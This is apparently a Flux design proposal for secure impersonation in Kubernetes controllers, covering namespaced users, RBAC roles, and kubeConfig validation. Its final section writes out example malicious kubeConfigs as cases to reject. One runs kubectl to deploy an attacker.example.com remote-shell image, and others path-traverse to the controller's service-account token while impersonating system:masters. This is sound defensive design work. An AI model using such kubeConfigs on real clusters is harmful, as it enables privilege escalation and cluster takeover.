# Secure Impersonation

* [Context](#context)
* [Goals](#goals)
* [Design](#design)
  - [controller serviceAccounts](#controller-serviceaccounts)
  - [user/group names](#user-group-names)
  - [serviceAccount impersonation](#serviceaccount-impersonation)
  - [defaulting](#defaulting)
  - [kubeConfig](#kubeconfig)
  - [sourceRefs](#sourcerefs)
  - [kubectl](#kubectl)
* [Concerns](#concerns)
  - [compatibiliity](#compatibiliity)
  - [performance](#performance)
* [Decisions](#decisions)
* [Tasks](#tasks)
* [Examples](#examples)
  - [default install](#default-install)
  - [tenants](#tenants)
  - [cross-namespace binding against Flux Groups](#cross-namespace-binding-against-flux-groups)
  - [opening Source policies with RBAC](#opening-source-policies-with-rbac)
  - [rejecting kubeConfigs](#rejecting-kubeconfigs)

## Context

Flux 2's installation model is built from CRD's.
This allows cluster operators to granularly control who can create/modify Sources and Applier type objects such as
GitRepository and Kustomization and for which Namespaces.
This also helps out the Deployment model.
While we could for example, still run independent instances of ex:kustomize-controller in each Namespace listening to only
Kustomize resources for that Namespace, it can use fewer resources to deploy a single controller watching all (or many) Namespaces.
Having a single controller reduces the onboarding steps necessary for a new Namespace owner to use Flux Custom Resources.
A central set of controllers is the primary Deployment mode for Flux.

In order to manage resources across many Namespaces, the default install gives kustomize-controller and helm-controller a full
cluster-admin ClusterRoleBinding.
This means cluster owners need to be careful who can create Kustomizations and HelmReleases as well as which Sources are in the cluster
due to the exposure they provide to act as cluster-admin.
This restricts who can create Source and Apply type objects into a burdensome approval flow for cluster owners and provides
poor delegation of self-service permissions which is a proven elements of good platforms.


## Goals

Flux should remain easy to install but promote secure practices in its default configuration.
Flux's security model should allow a cluster administrator to delegate self-service management of
Sources, Applies, Webhooks, Automations, and Notifications to Namespace owners/users without having to review every detail for
compliance to security policies.
Tenants or Namespace owners should be able to act freely without fear that their changes will overreach their permissions.

Flux APIs must structurally prevent privilege escalation and arbitrary code execution.
Flux APIs should be congruent with Kubernetes core API's security model.

The implementation should be usable and allow users quick, concise decisions regarding their security needs.


## Design

Currently kustomize-controller and helm-controller apply Kustomizations and HelmReleases using their own ServiceAccount by default.
It's possible to drop privileges using a `serviceAccountName` from the same Namespace -- this is more secure but this is an optional, explicit behavior.

The central controllers should change so they always assume a different User when applying and maintaining objects from manifests in Sources.
They should never use a controller SA when managing these resulting Objects, even for Garbage Collection, Health-Checks, or "values-from" merging.
This will allow the audit log to be more granularly examined for controllers' mutations on Flux APIs vs. GitOps-managed objects.
This technique prevents cross-tenant information disclosure and privilege escalation through misused Health-Checks or Garbage Collection.

#### controller serviceAccounts
The controller ServiceAccounts are far overprivileged for Flux API operations.
They should have a ClusterRoleBinding (or RoleBinding for single Namespace installs) for necessary Flux API Kinds and other needed objects such as ConfigMaps/Secrets + a separate ClusterRoleBinding for User Impersonation.

#### user/group names
All usernames impersonated by kustomize-controller and helm-controller for managing resources will be Namespaced relative to the `Kustomization`/`HelmRelease` object.
This is similar to the mechanism Kubernetes uses for [ServiceAccount User names](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-subjects)).
Kubernetes uses `system:serviceaccount:{{namespace}}:{{metadata.name}}` for ServiceAccounts.
The Flux username format should be `flux:user:{{namespace}}:{{spec.user}}`.
Alternatively flux could use the reserved prefix `system:flux:user:<...>` -- this would break the rules, but make it less likely for other systems to accidentally or maliciously use the FluxUser namespace when authenticating with kube-apiserver.
The default `spec.user` can be "reconciler".
A user field will be added to the Kustomization and HelmRelease spec.
It enables a partial override for the namespaced username the controller uses for that particular `Kustomization`/`HelmRelease`.
Namespace Owners can use the user override to optionally specify flux `Users` with different `Roles`/`RoleBindings` for managing each workload,
similar to Pods specifying non-default serviceAccounts from the same Namespace.
- **Con**: RoleBinding against a FluxUser requires specifying the namespace in the username string which can be hard to do in a generic way with kustomize -- would need to document a kustomize example

Flux controllers will also impersonate two Groups.
The first is `flux:users` which is a generic group, analogous to kubernetes' `system:authenticated` -- binding against this group allows all reconcilers to access particular resources via RBAC.
The second is `flux:users:{{namespace}}`, a namespace specific group which enables Namespace Owners to rolebind for reconcilers from another Namespace without mandating a particular username.
Neither of these groups are optional or overrideable -- they are a given property of each reconciler's Namespace and identity.
Note `users` is plural in the Group names, but not for a single User -- this matches kubernetes SA's.
It could cause typos, but not matching k8s plural semantics could also be confusing. We could be silly and add both without notable consequence. 🚲🏠

Impersonation of Users and Groups is done via API Headers that are permitted for the controller ServiceAccounts.
- **Con**: controller SA's can impersonate any user or group, not just flux:user namespaced ones is explicitly specified via a ClusterRole (impractical,bad-ux)
       controller code needs to be trusted not to impersonate 
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: flux-user-group-impersonator
rules:
- apiGroups: [""]
  resources: ["users", "groups"]
  verbs: ["impersonate"]
```

Using Namespaced Users and Groups provides a security boundary in the same way the ServiceAccount User names do.
It's never allowed for a reconcile to impersonate a non-namespaced User or user from outside the Namespace of the particular reconcile resource.
If a reconcile needs access to resources from another Namespace, the other Namespace can have a RoleBinding targeting the reconciler's differently namespaced User name.
Alternatively, a ClusterRoleBinding on the reconciler's namespaced User name can grant access to all Namespaces.

#### serviceAccount impersonation
`spec.serviceAccountName` will remain supported, but impersonating Users is preferable because it reduces the attack surface within a Namespace.
`ServiceAccounts` produce privileged token Secrets in the same Namespace often for use within `Pods`.
It's possible to impersonate a `ServiceAccount` User name even when they don't exist, but it's possible to create the resource after the fact creating generated tokens without a change in the reconciler behavior.
This doesn't happen with impersonated `Users` -- `Users` don't have any object representation. This prevents `Pods` in same Namespace as the `Kustomization`/`HelmRelease` from assuming the role of the privileged reconciler which would typically be an inappropriate privilege escalation.

Impersonation of reconciler ServiceAccounts is done via API Headers that are permitted for the controller ServiceAccounts.
The FluxUser Groups can still be added to requests for impersonated ServiceAccounts.
The token-fetching impersonation method currently implemented within kustomize-controller and helm-controller should be removed or flagged off.
This is a trade-off:
- *Pro*: Simpler tenant configs -- possible to bind against and impersonate a ServiceAccount User name that "doesn't exist"/isn't represented by a Resource -- user not required to actually create an SA
- *Pro*: No per-tenant crypto/random-number dependency due to SA-tokens
- *Pro*: Controller SA's no longer require cluster-wide access to Secrets
- *Pro*: Possible to configure controller to only have ServiceAccount impersonation via RBAC -- disable arbitrary User and Group Impersonation if controller code is untrusted (prevent use of `flux:user:*`)
- **Con**: Single namespace installs of Flux controllers may depend on ClusterRoleBindings to flux-sa-impersonator which requires cluster-admin setup permissions.
       Cannot(?) restrict ServiceAccount User impersonation to specific namespaces.
       Compare to SA's and token Secrets which a Namespace admin has full access to *only within their Namespace*.
       SA Token Impersonation allows single namespace installs to have less dependency on the cluster-admin (as long as Flux CRD's are already registered) while still keeping reconciler specific users.
       For this reason, it may be nice to keep `--sa-token-impersonation` as a controller flag and support it with the single-namespace installation option, despite the faults /w using SA's.
       It's possible to do some heuristic fallback here, but it could complicate things.

If SA Token impersonation is enabled, impersonated FluxUser Groups are omitted from the request.
ServiceAccounts still have a Group that you can rolebind against: `system:serviceaccounts:{{namespace}}`.

#### defaulting
Behavior must be clarified when both `user` and `serviceAccountName` are provided.
It should probably be a validation or runtime error condition.
If we make this a singleton in the API, we could prevent this structural issue, but it will be a bigger breaking change:
```yaml
# example singleton style API
spec:
  user:
    kind: ServiceAccount  # defaults to User
    name: reconciler-svc
```
If `user` and `serviceAccountName` are unset/empty-strings, the default FluxUser (proposed: `reconciler`) is used.
Alternatively, we could use [CRD defaulting](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#defaulting), but this puts other considerations on the design with detecting empty values.

#### kubeConfig
Kustomization and HelmRelease already have a `kubeConfig` option in addition to `serviceAccountName` and the proposed `user`.
KubeConfig's are loaded from Secrets in the same Namespace in the style of Cluster API.
They are safe to use literally as their own credential, since the FluxUser can be granted access to it as opposed to problematically assuming a controller SA.
Not all kubeConfigs may be assumed to have impersonation rights, but there is no field that explicitly disables User impersonation.
When `user`/`serviceAccountName` is unset and `kubeConfig` is non-empty, we could decide to ignore impersonation, and use the literal credential.
Impersonation of Users and ServiceAccounts as well as ServiceAccount Token Impersonation can still function with an explicitly set value and does work across cluster boundaries.
An impersonated User for the remote cluster will always match the Namespace used for the reconciler in the source cluster.

KubeConfigs that mention the controller SA token in `/var/run/secrets/kubernetes.io/serviceaccount` must be rejected, because this is a privilege escalation route.
These filepaths need to be resolved to absolute paths before they are checked to prevent subversive path traversal via symlinks.

KubeConfigs that set `users[].user.exec.command` or `users[].user.auth-provider.config.cmd-path` should be rejected unless all `[command|cmd-path]` values return
an [`os.exec.LookPath()`](https://golang.org/pkg/os/exec/#example_LookPath) inside the `/kubeconfig-bin/` of the controller Pod filesystem.
While executing the kubeConfig, the `$PATH` likely needs to be preserved in case the auth-helper needs to execute other POSIX binary dependencies.
Restricting `[command|cmd-path]` to `/kubeconfig-bin/` allows the administrator an opt-in directory where they can add tools they trust/accept like `gcloud` and `aws-iam-authenticator` 
while disallowing access to more dangerous binaries like `kubectl`. This mechanism is somewhat inspired by `/sbin` and `setuid` binaries.

Using exec helpers is not an approach used by Cluster API.
In addition to being insecure, it's not possible to distrubite controllers containing all of the necessary binaries to support all kubernetes platforms.
Cluster API providers instead schedule regular updates to kubeConfig Secret data which is more tenant friendly and dependency-free.

Regardless, we must sanitize the kubeConfig, so it's easy to add a restricted, PATH-based allow-list that the flux-system owner can control if they choose to manage remote clusters in this way.


#### sourceRefs
Controllers should impersonate the reconciler User when fetching sourceRefs.
This allows for users to open up Source access policies via RBAC, rather than relying on a Gatekeeper or Kyverno installation to restrict default Flux behavior.
ClusterRoles should exist for the Source controller API's `flux-source-viewer`, `flux-gitrepo-viewer`, `flux-helmrepo-viewer`, `flux-bucket-viewer`, etc.
FluxUsers should be bound explicitly against these ClusterRoles, either with RoleBindings (for single Namespaces) or ClusterRoleBindings.
Cross-Namespace access of Sources can be enabled per Namespace or across the whole cluster via RoleBindings/ClusterRoleBindings to a FluxUser, Flux Group, or All FluxUsers.
Kinds of sources can be differentiated, and individual Sources can be permitted per-User/Group through `resourceNames` within Role rules.
The current API objects that use sourceRefs are `Kustomization` and `HelmChart`.
`Kustomization` and `HelmRelease` have the `serviceAccountName` proposed `user` fields for impersonation.
Both of these impersonation fields should also be added to `HelmChart` because reconciling one requires accessing other Sources.
source-controller will need impersonation behavior implemented /w additional RBAC and any supporting flags/options.
Alternatively, `HelmChart` could be moved into the helm-controller control loops instead of source-controller.
It's not sufficient to gate the creation of `HelmCharts` based off of a `sourceRef` permission check in `HelmRelease`;
RBAC rules can change at any time, so the source-controller API client should have the constraints of the impersonated User.

If a kubeConfig is specified for a resource that specifies a sourceRef, a separate client matching the same User or SA from the remote cluster is used in the source cluster.
This is sensible because the User for the remote cluster must match the source cluster's reconciling Namespace.
If no User is specified for the remote cluster, the default FluxUser is impersonated to fetch the sourceRef from the source cluster.  


#### notifications
notification-controller needs to be able to impersonate FluxUsers and ServiceAccounts.
`Recievers` specify `resources` which are Sources -- `Alerts` specify `eventSources` which can be Sources or Applies.
Both impersonation fields should also be added to `Recievers` and `Alerts` to allow for the same kind of access polices possible with sourceRefs.

This will prevent any cross-tenant misuse of the notification API's: notably denial-of-service through Recievers and information-disclosure through Alerts.
Providers appear to be safe as is.

The default install's flux-system:cluster-admin FluxUser can still be used to configure Recievers and Alerts for all objects in the cluster.
In this configuration, other Namespaces will need to be granted access.

It might be possible to get `alert.spec.eventSources` and `reciever.spec.resources` to work across clusters by specifying `kubeConfig`;
this could open up some interesting management cluster patterns for monitoring credentials and centralized webhooks.


#### cluster-role aggregation
We should use [ClusterRole Aggregation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#aggregated-clusterroles) to configure the the top-level flux ClusterRoles.

This means we can define `flux-gitrepo-viewer`, `flux-helmrepo-viewer`, `flux-bucket-viewer` and use an aggregation label to define `flux-source-viewer` without repeating ourselves.
Adding another source in the future does not require updating the `flux-source-viewer` object, just creating a new aggregated role.

It's possible to take this one step further and aggregate `flux-source-viewer` into the kubernetes default role for `edit`.
It would be useful for `view` as well, depending on your security model.
`flux-apply-editor` and `flux-source-editor` might be a good ClusterRoles to aggregate under `admin` since it's useful for enabling tenants to be
self-service within their Namespace from their own control-repo.

We need to work out which roles are appropriate to aggregate under any default Kubernetes roles, and whether this should be done with a default
flux install or taken as an install option.

> Note: `admin` is an aggregated role containing `edit` which contains `view`, but `cluster-admin` is not an aggregated role -- it explicitly allows all resources including any Flux objects.


#### kubectl
`client-go` currently has an issue where `kubectl --as=user --as-group=group` is ignored when using the in-cluster config
for Pod ServiceAccount tokens.
This prevents kustomize-controller from using its Pod ServiceAccount to impersonate FluxUsers when applying resources
by exec'ing `kubectl`.
The workaround to this bug is to heuristically detect the in-cluster config and supply it explicitly with equivalent
flags or a kubeConfig file for the token, CA, apiserver-endpoint, and protocol.
This bug affects all binaries using client-go's flag-options parser, but does not affect libraries like helm that use
injected clients.

We can maintain a workaround library that shims the kubectl exec or move to using kubectl as a library directly.


## Concerns
#### compatibiliity
These changes are mostly breaking. Existing Flux deployments are not going to have RBAC configured for every reconciler.
Some reconciler ServiceAccounts may need `flux-source-viewer` bound to them.
Others may prefer to update their serviceAccountNames to user.
Migration/Upgrade documentation will be necessary.
It's possible to build a tool-assisted migration that modifies resources in a git repo. (`flux migrate <git-repo-path>` ?)

#### performance
Flux controllers will be using many more Kubernetes client Objects, informers, and caches.
Storing a map of Flux Users to clients/caches might be a good first step.
kubeConfig client/caches are not stored currently, which was an explicit decision to support refreshing clients,
this this doesn't have to be true for all kubeConfigs.

We have done some performance testing in the past, but it would be good to have a strategy/tools to help us
understand performance regressions.

## Decisions
Direction should be decided on the following:

- [ ] `flux:user` vs. `system:flux:user` User prefix
- [ ] `flux:users` vs. `flux:user` Group prefix
- [ ] default FluxUser name (proposed: "reconciler")
- [ ] source-controller impersonation vs. HelmChart moving to helm-controller
- [ ] HelmChart templates specifying a different user/serviceAccountName than their parent HelmRelease
- [ ] kubeConfig for management cluter usage of notification-controller Recievers and Alerts
- [ ] user + serviceAccount validation vs. API change deprecating `serviceAccountName`
- [ ] user / serviceAccount defaulting or empty value behavior
- [ ] kubeConfigs require impersonation permission vs. no impersonation on empty or default API value
- [ ] serviceAccount token impersonation feature-flag
- [ ] ClusterRole aggregation for flux objects in k8s default `view`, `edit`, `admin`


## Tasks
- [ ] add `user` to Kustomization
- [ ] add `user` to HelmRelease
- [ ] add `user`, `serviceAccountName` to HelmChart
- [ ] create client generation library for kubeConfig, user, serviceAccountName
- [ ] use client-gen library in kustomize-controller
  - [ ] sourceRefs
  - [ ] garbage-collector
  - [ ] prune
- [ ] use client-gen library in helm-controller
  - [ ] sourceRefs
  - [ ] helm client
  - [ ] valuesFrom
- [ ] use client-gen library in source-controller -- alternatively move HelmChart into helm-controller
  - [ ] sourceRefs
- [ ] use client-gen library in notification-controller
  - [ ] eventSources
  - [ ] resources
  - [ ] kubeConfig?
- [ ] ensure 403's/404's for unauthorized upadte Kustomization/HelmRelease status
- [ ] create kubectl shim
  - [ ] decide on exec + workaround or library
  - [ ] implement impersonation /w flux users and groups
  - [ ] accept kubeConfig override
- [ ] update kubeConfig lib
  - [ ] reject non `/kubeconfig-bin/` `cmdpath` kubeConfigs
  - [ ] reject in-cluster credential kubeConfigs
  - [ ] ensure rejected kubeConfigs update Kustomization/HelmRelease status
- [ ] use kubectl shim in kustomize-controller
  - [ ] ensure 403's/404's for unauthorized upadte Kustomization/HelmRelease status
- [ ] split up controller ServiceAccounts
  - [ ] create minimal SA for source-controller
  - [ ] create minimal SA for kustomize-controller
  - [ ] create minimal SA for helm-controller
  - [ ] create minimal SA for notification-controller
- [ ] update RBAC for `flux bootstrap`
  - [ ] enable User/Group/ServiceAccount impersonation for proper controllers
  - [ ] Update `gotk-sync.yaml` to use explicit admin user, default User is unused but separately useful in flux-system
  - [ ] ClusterRoleBind `cluster-admin` to `flux:user:flux-system:admin`
  - [ ] create ClusterRoles for `flux-source-viewer`, `flux-gitrepo-viewer`, `flux-helmrepo-viewer`, `flux-bucket-viewer`
  - [ ] create ClusterRoles for `flux-source-editor`, `flux-gitrepo-editor`, `flux-helmrepo-editor`, `flux-bucket-editor`
  - [ ] create ClusterRoles for `flux-apply-viewer`, `flux-kustomization-viewer`, `flux-helmrelease-viewer`
  - [ ] create ClusterRoles for `flux-apply-editor`, `flux-kustomization-editor`, `flux-helmrelease-editor`
  - [ ] aggregate necessary roles under the default k8s `view`, `edit`, `admin`
- [ ] update `flux create tenant`
  - [ ] change RoleBinding to namespaced, default, tenant FluxUser -- remove ServiceAccount
  - [ ] bind `admin` to tenant FluxUser (optionally `cluster-admin` to allow tenant to manage LimitRanges and delete their own Namespace?)
  - [ ] bind `flux-source-viewer` to tenant FluxUser
  - [ ] unhide the tenant command


## Examples

#### default install
Since impersonation within the cluster is always required, the default install must have explicit RBAC
for the existing defaulted cluster-admin access.
A flux-system managed by `flux bootstrap` will have a `gotk-sync.yaml` that has these fields:
```yaml
kind: GitRepository
metadata:
  name: flux-system
spec:
  # ...
---
kind: Kustomization
metadata:
  name: flux-system
spec:
  user: cluster-admin # explicit use of clustre-admin instead of default reconciler
  # ...
---
kind: ClusterRoleBinding  # note: this does not live within the flux-system Namespace, even though it's underneath the folder
metadata:
  name: flux-system-cluster-admin
roleRef:
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: User
    name: flux:user:flux-system:cluster-admin
```

#### tenants
The tenant sub-command should be changed to encourage the user to create a matching Source and Apply object.
Alternatively, it could take in some sourceRef generation flags.

The `--with-namespace` flag allows for cross-namespace binding against the tenant-user that will be impersonated.

Running `flux create tenant dev-team --with-namespace frontend --with-namespace backend --export` produces this RBAC:
```yaml
#### dev-team tenant NS
kind: Namespace
metadata:
  name: dev-team  # the Kustomization or HelmRelease should be in this Namespace
---
kind: RoleBinding
metadata:
  name: reconciler-flux-source-viewer
  namespace: dev-team
roleRef:
  kind: ClusterRole
  name: flux-source-viewer  # read Sources from the same NS
subjects:
  - kind: User
    name: flux:user:dev-team:reconciler
---
kind: RoleBinding
metadata:
  name: reconciler-admin
  namespace: dev-team
roleRef:
  kind: ClusterRole
  name: admin  # admin access to tenant's own "dev-team" NS
subjects:
  - kind: User
    name: flux:user:dev-team:reconciler
---
#### frontend
kind: Namespace
metadata:
  name: frontend
---
kind: RoleBinding
metadata:
  name: reconciler-admin
  namespace: frontend
roleRef:
  kind: ClusterRole
  name: admin  # admin access to other NS
subjects:
  - kind: User
    name: flux:user:dev-team:reconciler
---
#### backend
kind: Namespace
metadata:
  name: backend
---
kind: RoleBinding
metadata:
  name: reconciler-admin
  namespace: backend
roleRef:
  kind: ClusterRole
  name: admin  # admin access to other NS
subjects:
  - kind: User
    name: flux:user:dev-team:reconciler
```

#### cross-namespace binding against Flux Groups
An `infrastructure` Namespace owner can allow any `dev-team` reconciler User (using their Flux Group) to
create health-checks that depend on Kustomizations from the `infrastructure` Namespace.
This information is otherwise private unless a RoleBinding like this allows this access.
```yaml
kind: RoleBinding
metadata:
  name: flux-users-kustomization-viewer
  namespace: infrastructure
roleRef:
  kind: ClusterRole
  name: flux-kustomization-viewer
subjects:
  - kind: Group
    name: flux:users:dev-team
```

A cluster owner can use a ClusterRoleBinding to grant `view` to any Flux User (via the Group)
```yaml
kind: ClusterRoleBinding
metadata:
  name: flux-all-users-view
roleRef:
  kind: ClusterRole
  name: view
subjects:
  - kind: Group
    name: flux:users
```


#### opening Source policies with RBAC
Accessing Sources across Namespaces is denied by defaultl.

A `flux-sytem` owner can allow HelmReleases from the `production` Namespace access to a specific HelmRepository.
from the `flux-system` Namespace.
If the `production` Namespace does not grant any other Source access, this is the only usable HelmRepository.
```yaml
kind: Role
metadata:
  name: view-helmrepo-stable
  namespace: flux-system
rules:
  - apiGroups: ["helm.toolkit.fluxcd.io/v2beta1"]
    resources: ["helmrelease"]
    verbs: ["get", "watch", "list"]
    resourceNames: ["stable"]
---
kind: RoleBinding
metadata:
  name: flux-production-helmrepo-stable-viewer
  namespace: flux-system
roleRef:
  kind: Role
  name: view-helmrepo-stable
subjects:
  - kind: Group
    name: flux:users:production
```

A cluster owner can use a ClusterRoleBinding to grant `flux-source-viewer` to any Flux User (via the Group).
With this, any Flux User can now specify any Source from any Namespace.
Without it, referencing a cross-namespace Source will result in an error condition on the reconciling API object (Kustomization/HelmRelease).
```yaml
kind: ClusterRoleBinding
metadata:
  name: flux-all-users-view
roleRef:
  kind: ClusterRole
  name: flux-source-viewer
subjects:
  - kind: Group
    name: flux:users
```


#### impact on helmChart templates
Both HelmReleases and HelmCharts require a FluxUser to impersonate, either for releasing the chart or copying it from the sourceRef.

For existing HelmReleases, both the HelmRelease and resulting HelmChart template
will use to the same effective default FluxUser ("reconciler").

Adding a user to a HelmRelease will copy the user or serviceAccountName to the HelmChart template:
```yaml
kind: HelmRelease
metadata:
  name: login-app
  namespace: frontend
spec:
  user: frontend-app
  chart:
    name: ./charts/login-app
    # user: frontend-app  # inherited from the parent HelmRelease when unspecified
    sourceRef:
      kind: GitRepository
      name: frontend-app
```

Specifying a different FluxUser for the Chart template is strangely/controversially sensible and valid:
```yaml
kind: HelmRelease
metadata:
  name: login-app
  namespace: frontend
spec:
  user: frontend-app
  chart:
    name: ./charts/login-app
    user: frontend-app-source-viewer  # the template has a different user
    sourceRef:
      kind: GitRepository
      name: frontend-app
```


#### rejecting kubeConfigs
Given a Kustomzation that references a kubeConfig Secret:

```yaml
kind: Kustomization
spec:
  kubecConfig:
    secretRef:
      name: stage-cluster-kubeconfig
```

The following kubeConfigs will only be used to create a client if `gcloud` or `aws-iam-authenticator` comes from `/kubeconfig-bin/` within the kustomize-controller fs.
Otherwise it's rejected and an error is posted to the Kustomization status.
```yaml
kind: Secret
metadata:
  name: stage-cluster-kubeconfig
value: |
  users:
  - name: gke-example
    user:
      auth-provider:
        name: gcp
        config:
          cmd-args: config config-helper --format=json
          cmd-path: gcloud
          expiry-key: '{.credential.token_expiry}'
          token-key: '{.credential.access_token}'
```
```yaml
kind: Secret
metadata:
  name: dev-cluster-kubeconfig
value: |
  users:
  - name: aws-example
    user:
      auth-provider:
        exec:
          apiVersion: client.authentication.k8s.io/v1alpha1
          args: [token, -i, cluster-name]
          command: aws-iam-authenticator
          env: {name: AWS_<redacted>}
```

This dangerous kubeConfig will likely be rejected unless the flux-system admin permits `kubectl` to be exec'd for an auth provider in `/kubeconfig-bin/`:
```yaml
kind: Secret
metadata:
  name: malicious-kubectl-kubeconfig
value: |
  users:
  - name: gke-example
    user:
      auth-provider:
        name: gcp
        config:
          cmd-path: kubectl
          cmd-args: create deploy debug --image attacker.example.com/remote-shell
          expiry-key: '{.credential.token_expiry}'
          token-key: '{.credential.access_token}'
```

These kubeConfigs will always be rejected, because they allow a user to bypass FluxUsers and use the controller SA:
```yaml
kind: Secret
metadata:
  name: local-kubeconfig
value: |
  clusters:
  - name: local
    cluster:
      server: https://kubernetes.default.svc.cluster.local
      certificate-authority: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  users:
  - name: controller-sa
    user:
      tokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token
```
```yaml
kind: Secret
metadata:
  name: local-impersonating-kubeconfig
value: |
  clusters:
  - name: local
    cluster:
      server: https://kubernetes.default.svc.cluster.local
      certificate-authority: /home/../var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  users:
  - name: controller-sa-impersonator
    user:
      tokenFile: ../../../../../../../../var/run/secrets/../secrets/kubernetes.io/serviceaccount/token
    as: admin
    as-groups:
      - system:masters
    as-user-extra:
      reason:
        - evil
```
